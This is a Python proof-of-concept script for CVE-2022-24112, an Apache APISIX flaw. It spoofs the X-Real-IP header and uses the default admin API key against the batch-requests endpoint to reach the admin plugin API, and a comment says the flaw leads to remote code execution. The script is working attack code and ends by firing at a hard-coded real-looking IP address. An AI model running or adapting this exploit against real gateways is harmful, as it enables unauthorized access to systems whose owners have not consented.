import requests
from secrets import token_hex
# Apache APISIX 存在改写 X-REAL-IP header 的风险公告（CVE-2022-24112），利用batch-requests插件 可以RCE
# https://mp.weixin.qq.com/s/5qAfjjVuE4604fMpQoEfMg
# get poc from biu ~

def poc(host, port=443):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)
    token = token_hex(10)
    uris = ['/apisix/batch-requests', '/api-gw/batch']
    hits = [f'failed to load plugin {token}']
    data = {"headers": {'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1', 'X-Real-IP': '127.0.0.1'},
            'pipeline': [{'path': f'/apisix/admin/plugins/{token}'}]}

    try:
        targets = ['{}{}'.format(target, uri) for uri in uris]
        with requests.Session() as session:
            for target in targets:
                response = session.post(target, timeout=10, json=data, verify=False, proxies={'http': "http://127.0.0.1:8080"})
                for hit in hits:
                    if hit in response.text:
                        output = response.json()

                        return True, host, target, output
    except Exception as error:
        return False
    return False
'''

'''

print (poc(host='183.66.101.103', port=9080))
